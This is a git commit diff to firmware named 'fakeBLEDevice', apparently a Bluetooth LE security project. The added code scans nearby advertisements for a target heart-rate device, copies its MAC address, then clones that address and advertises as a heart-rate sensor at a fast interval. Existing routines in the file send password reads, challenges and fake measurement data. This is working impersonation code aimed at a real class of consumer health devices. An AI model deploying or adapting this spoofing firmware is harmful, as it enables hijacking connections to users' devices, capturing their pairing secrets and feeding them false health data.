999851bec9d9a8fabcfc91b480e5416683fe8eb7
Wei Tat Lee <weitat95@live.com>
2019-08-13 03:48:47 +0100

    Discover MAC address, change mac Address

--- fakeBLEDevice/main.cpp
+++ fakeBLEDevice/main.cpp
@@ -39,17 +39,25 @@ uint8_t pairing = 0; // 0 -> measuring, 1 -> pairing
 uint8_t sendingData = 0;
 uint8_t timeStamp[4];
 
+bool found_honey = true;
+//bool found_honey = false;
+uint8_t honeyPot[] = {0x7C, 0x2A, 0x8D, 0x42, 0x52, 0xD9};
+//uint8_t honeyPot[6];
+
 void button1Callback(void){
     pairing = !pairing;
 }
 
 void initiatePasswordRead(){
+    pc.printf("Initiate Password\r\n");
     hrServicePtr->sendPasswordRead();
 }
 void initiateChallenge(){
+    pc.printf("Initiate Challenge\r\n");
     hrServicePtr->sendPasswordChallenge();
 }
 void initiateFakeData(){
+    pc.printf("Sent FakeData\r\n");
     hrServicePtr->sendFakeData();
 }
 
@@ -61,7 +69,6 @@ void when_update_enabled(GattAttribute::Handle_t handle)
     }else{
         eventQueue.call(initiateChallenge);
     }
-
 }
 
 void when_update_disabled(GattAttribute::Handle_t handle)
@@ -72,6 +79,7 @@ void when_update_disabled(GattAttribute::Handle_t handle)
 
 void disconnectionCallback(const Gap::DisconnectionCallbackParams_t *params)
 {
+    pc.printf("DisconenctionCallBack\r\n");
     led2 = 1;
     led3 = 1;
     led4 = 1;
@@ -82,11 +90,13 @@ void disconnectionCallback(const Gap::DisconnectionCallbackParams_t *params)
 
 void connectionCallback(const Gap::ConnectionCallbackParams_t *params)
 {
+    pc.printf("ConnectionCallBack\r\n");
     led2 = 0;
 }
 
 void dataWrittenCallback(const GattWriteCallbackParams * params)
 {
+    pc.printf("dataWrittenCallBaack: %d\r\n", (params->data)[0]);
     led4 = !led4;
 
     if (pairing){
@@ -115,6 +125,7 @@ void dataWrittenCallback(const GattWriteCallbackParams * params)
     
 }
 void dataSentCallback(unsigned params){
+    pc.printf("DataSentCallBackk\r\n");
     if(!pairing && sendingData){
         sendingData = 0;
         BLE::Instance().gap().disconnect(Gap::DisconnectionReason_t::REMOTE_USER_TERMINATED_CONNECTION);
@@ -150,8 +161,7 @@ void onBleInitError(BLE &ble, ble_error_t error)
 }
 void setupMacAddress()//uint8_t * macAddress)
 {
-    uint8_t  address1[6] = {0x7C,0x2A,0x8D,0x42,0x52,0xD9};
-    BLE::Instance().gap().setAddress(BLEProtocol::AddressType::PUBLIC, address1);
+    BLE::Instance().gap().setAddress(BLEProtocol::AddressType::PUBLIC, honeyPot);
 }
 
 void printMacAddress()
@@ -166,6 +176,79 @@ void printMacAddress()
         pc.printf("%02x:", address[i]);
     }
     pc.printf("%02x\r\n", address[0]);
+}
+
+
+void bleInitComplete(BLE::InitializationCompleteCallbackContext *params);
+void scheduleBleEventsProcessing(BLE::OnEventsToProcessCallbackContext* context);
+
+void on_scan(const Gap::AdvertisementCallbackParams_t *params){
+    if (found_honey){
+        return;
+    }
+
+    for (uint8_t i = 0; i < params->advertisingDataLen; ++i) {
+        const uint8_t record_length = params->advertisingData[i];
+        if (record_length == 0) {
+            continue;
+        }
+        const uint8_t type = params->advertisingData[i + 1];
+        const uint8_t *value = params->advertisingData + i + 2;
+        //pc.printf("Scanned !\r\n");
+        //pc.printf("Address: ");
+        ble_error_t bleerror;
+        if(type==0x02 && value[0]==0x09 && value[1]==0x78){
+            found_honey = true;
+            pc.printf("Jackpot!\n\r");
+            pc.printf("Honey Address: ");
+            for(int i=5; i>0; i--){
+                honeyPot[i]=params->peerAddr[i];
+                pc.printf("%x:",honeyPot[i]);
+            }
+            honeyPot[0]=params->peerAddr[0];
+            pc.printf("%x\r\n", honeyPot[0]);
+
+            bleerror = BLE::Instance().stopScan();
+            pc.printf("stopscanError:%d\r\n", bleerror);
+            
+            bleerror = BLE::Instance().shutdown();
+            pc.printf("shutdownError:%d\r\n", bleerror);
+            
+            eventQueue.break_dispatch();
+
+            BLE::Instance().onEventsToProcess(scheduleBleEventsProcessing);
+            
+            bleerror = BLE::Instance().init(bleInitComplete);
+            pc.printf("InitError:%d\r\n", bleerror);
+            
+            eventQueue.dispatch_forever();
+            return;
+        }
+
+//        bool flagg = true;
+//        for (int i=5; i>0; i--){
+//            flagg &= params->peerAddr[i] == addTest[i];
+//            //pc.printf("%x:",params->peerAddr[i]);
+//        }
+//        flagg &= params->peerAddr[0] == addTest[0];
+//        //pc.printf("%x\n\r",params->peerAddr[0]);
+//        if(flagg){
+//            pc.printf("Found!\r\n");
+//            if(type==0x02){
+//                for (int i=0; i<record_length-1; i++){
+//                    pc.printf("%c",value[i]);
+//                }
+//            }
+//            pc.printf("type: 0x%x\r\n",type);
+//            pc.printf("value: 0x");
+//            for (int i=0; i<record_length-1; i++){
+//                pc.printf("%x ", value[i]);
+//            }
+//            pc.printf("\r\n");
+//            BLE::Instance().shutdown();
+//        }
+    }
+
 }
 
 void bleInitComplete(BLE::InitializationCompleteCallbackContext *params)
@@ -191,24 +274,30 @@ void bleInitComplete(BLE::InitializationCompleteCallbackContext *params)
     ble.gattServer().onDataSent(dataSentCallback);
     ble.gap().onConnection(connectionCallback);
     ble.gap().onDisconnection(disconnectionCallback);
-
+    if(!found_honey){    
+        pc.printf("Looking for target device's MAC Address\r\n");
+        /* Setup Scanning Parameters */
+        uint16_t interval = 160; // ms
+        uint16_t window = 40; // ms
+        uint16_t timeout = 0; // s
+        bool active = false; // Active scanning
+        ble.gap().setScanParams(interval,window,timeout,active);
+        ble.gap().startScan(&on_scan);
+    }else{
+        /* Setup MAC Address. */
+        pc.printf("\nSetting new MAC Address, and advertising...\r\n");
+        setupMacAddress();
     
-
-
-    /* Setup MAC Address. */
-    
-    setupMacAddress();
-
-    /* Setup advertising. */
-    ble.gap().accumulateAdvertisingPayload(GapAdvertisingData::BREDR_NOT_SUPPORTED | GapAdvertisingData::LE_GENERAL_DISCOVERABLE);
-    ble.gap().accumulateAdvertisingPayload(GapAdvertisingData::COMPLETE_LIST_16BIT_SERVICE_IDS, (uint8_t *)uuid16_list, sizeof(uuid16_list));
-    ble.gap().accumulateAdvertisingPayload(GapAdvertisingData::GENERIC_HEART_RATE_SENSOR);
-    ble.gap().accumulateAdvertisingPayload(GapAdvertisingData::COMPLETE_LOCAL_NAME, (uint8_t *)DEVICE_NAME, sizeof(DEVICE_NAME));
-    ble.gap().setAdvertisingType(GapAdvertisingParams::ADV_CONNECTABLE_UNDIRECTED);
-    ble.gap().setAdvertisingInterval(1000); /* 1000ms */
-    ble.gap().startAdvertising();
-
-    printMacAddress();
+        /* Setup advertising. */
+        ble.gap().accumulateAdvertisingPayload(GapAdvertisingData::BREDR_NOT_SUPPORTED | GapAdvertisingData::LE_GENERAL_DISCOVERABLE);
+        ble.gap().accumulateAdvertisingPayload(GapAdvertisingData::COMPLETE_LIST_16BIT_SERVICE_IDS, (uint8_t *)uuid16_list, sizeof(uuid16_list));
+        ble.gap().accumulateAdvertisingPayload(GapAdvertisingData::GENERIC_HEART_RATE_SENSOR);
+        ble.gap().accumulateAdvertisingPayload(GapAdvertisingData::COMPLETE_LOCAL_NAME, (uint8_t *)DEVICE_NAME, sizeof(DEVICE_NAME));
+        ble.gap().setAdvertisingType(GapAdvertisingParams::ADV_CONNECTABLE_UNDIRECTED);
+        ble.gap().setAdvertisingInterval(10); /* 1000ms */
+        ble.gap().startAdvertising();
+        printMacAddress();
+    }
 }
 
 void scheduleBleEventsProcessing(BLE::OnEventsToProcessCallbackContext* context) {
